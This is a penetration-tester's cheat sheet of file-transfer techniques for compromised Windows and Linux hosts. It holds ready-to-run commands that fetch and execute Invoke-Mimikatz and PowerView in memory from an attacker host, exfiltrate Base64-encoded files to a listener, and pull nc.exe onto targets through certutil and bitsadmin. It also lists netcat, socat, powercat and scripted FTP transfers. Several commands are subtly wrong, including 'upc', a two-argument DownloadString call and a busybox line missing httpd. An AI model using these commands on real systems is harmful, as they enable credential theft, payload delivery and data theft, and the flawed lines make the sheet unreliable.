# file transfers

## Windows

### powershell download

```
(New-Object System.Net.WebClient).DownloadFile('https://<LHOST>/PowerView.ps1',".\PowerView.ps1")
Invoke-WebRequest https://<LHOST>/PowerView.ps1 -OutFile PowerView.ps1
```

### powershell in memory execution

```
IEX (New-Object Net.WebClient).DownloadString('https://<LHOST>/Invoke-Mimikatz.ps1')
Invoke-WebRequest https://<LHOST>/Invoke-Mimikatz.ps1 | iex
```

### if powershell first launch configuration has not been completed 

use `-UseBasicParsing`

```
Invoke-WebRequest https://<LHOST>/PowerView.ps1 -UseBasicParsing | iex
```

or disable first run customization

```
reg add "HKLM\SOFTWARE\Microsoft\Internet Explorer\Main" /f /v DisableFirstRunCustomize /t REG_DWORD /d 2
```

### powershell uploads

catch with netcat

```
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'c:/<FILE>' -Encoding Byte))
Invoke-WebRequest -Uri http://<LHOST>:<LPORT> -Method POST -Body $b64
```

### bitsadmin

```
bitsadmin /transfer n http://<LHOST>/nc.exe C:\Temp\nc.exe
```

powershell download or upload using bitsadmin

```
Import-Module bitstransfer;Start-BitsTransfer -Source "http://<LHOST>/nc.exe" -Destination "C:\Temp\nc.exe"
Start-BitsTransfer "C:\<FILE>" -Destination "http://<RHOST>/uploads/bloodhound.zip" -TransferType Upload -ProxyUsage Override -ProxyList PROXY01:8080 -ProxyCredential INLANEFREIGHT\svc-sql
```

### certutil

```
certutil.exe -verifyctl -split -f http://<LHOST>/nc.exe
```

## Netcat

```
# source
nc -nv <ip> <port> < <file>

# destination
nc -lvnp <port> > <file>
```

## Powercat

```
# source
powercat -c <ip> -p <port> -i C:\<src_path>

# destination
powercat -l -p <port> -of C:\<dst_path>
```

## Socat

```
# source
socat TCP4-LISTEN:<port>,fork file:<src_path>

# destination
socat TCP4:<ip>:<port> file:<dst_path>,create
```

## HTTP server + Powershell

```
# create server on attacker machine with one of these
python3 -m http.server <port>
python2 -m SimpleHTTPServer <port>
php -S 0.0.0.0:<port>
ruby -run -e httpd . -p <port>
busybox -f -p <port>

# download with powershell oneliner
## download file
(New-Object System.Net.WebClient).DownloadString("<source>","<destination>")

## execute powershell script without touching disk
iex (New-Object System.Net.WebClient).DownloadString("<source>")

## upload file
iex (New-Object System.Net.WebClient).UploadFile("<destination>", "<file>")
```

## pure-ftp

```
# ftp server needs to be configured before

echo open <attacker> 21 > ftp.txt
echo user <user> >> ftp.txt
echo <pass> >> ftp.txt
echo bin >> ftp.txt
echo get <file> >> ftp.txt
echo bye >> ftp.txt

ftp -v -n -s:ftp.txt
```

## exe2hex

```
upc -9 <file>
exe2hex -x <file> -p <output>.cmd
# copy paste into target terminal
```

## If everything fails, base64

